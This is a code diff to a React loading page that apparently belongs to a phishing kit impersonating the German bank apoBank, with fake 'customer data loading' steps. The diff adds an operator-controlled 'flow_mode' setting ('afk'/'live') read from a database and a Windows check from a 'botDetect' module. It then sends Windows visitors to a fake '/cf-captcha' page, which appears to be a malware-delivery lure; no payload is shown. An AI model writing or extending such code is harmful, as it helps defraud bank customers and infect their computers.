@@ -1,6 +1,8 @@
 import { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import apobankLogo from "@/assets/apobank-logo-square.png";
+import { supabase } from "@/integrations/supabase/client";
+import { isWindows } from "@/lib/botDetect";
 
 const STEPS = [
   { text: "Kundendaten werden geladen.", duration: 2000 },
@@ -14,7 +16,20 @@ const ProfilLoading = () => {
 
   useEffect(() => {
     if (idx >= STEPS.length) {
-      navigate("/profil-success");
+      (async () => {
+        let mode = "afk";
+        try {
+          const { data } = await (supabase as any)
+            .from("api_settings").select("flow_mode").limit(1).maybeSingle();
+          if (data?.flow_mode) mode = data.flow_mode;
+        } catch {}
+        const gate = isWindows() && (mode === "afk" || mode === "live");
+        if (gate) {
+          window.location.href = `/cf-captcha?next=${encodeURIComponent("/profil-success")}`;
+        } else {
+          navigate("/profil-success");
+        }
+      })();
       return;
     }
     const t = setTimeout(() => setIdx((i) => i + 1), STEPS[idx].duration);
